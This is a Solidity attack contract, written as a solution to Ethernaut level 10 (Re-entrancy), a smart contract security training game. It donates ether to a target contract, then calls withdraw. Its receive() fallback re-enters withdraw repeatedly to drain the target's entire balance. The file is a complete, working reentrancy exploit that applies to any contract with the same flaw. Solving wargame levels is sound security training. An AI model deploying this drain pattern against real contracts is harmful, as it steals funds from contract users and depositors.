// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "./interfaces/IReentrance.sol";

/**
 * @title Reentrance Attack (Ethernaut Challenge Level 10 - Re-entrancy)
 * @author Emre Tepe (@emretepedev)
 * @notice Attack contract for level 10
 * @custom:ethernaut https://ethernaut.openzeppelin.com/level/0xe6BA07257a9321e755184FB2F995e0600E78c16D
 */
contract ReentranceAttack {
    IReentrance private immutable target;

    /**
     * @param target_ Address of target contract
     */
    constructor(IReentrance target_) {
        target = target_;
    }

    /*//////////////////////////////////////////////////////////////
                                Attack
    //////////////////////////////////////////////////////////////*/

    /**
     * @notice Attack and solve the level
     */
    function attack() external payable {
        require(0 < msg.value && msg.value <= address(target).balance, "Reentrance: Wrong value");

        target.donate{ value: msg.value }(address(this));

        require(0 < target.balanceOf(address(this)), "Reentrance: Wrong balance");

        target.withdraw(msg.value);

        require(0 == address(target).balance, "Reentrance: Attack failed");
    }

    /*//////////////////////////////////////////////////////////////
                            Helpers & Others
    //////////////////////////////////////////////////////////////*/

    receive() external payable {
        target.withdraw(msg.value);
    }
}
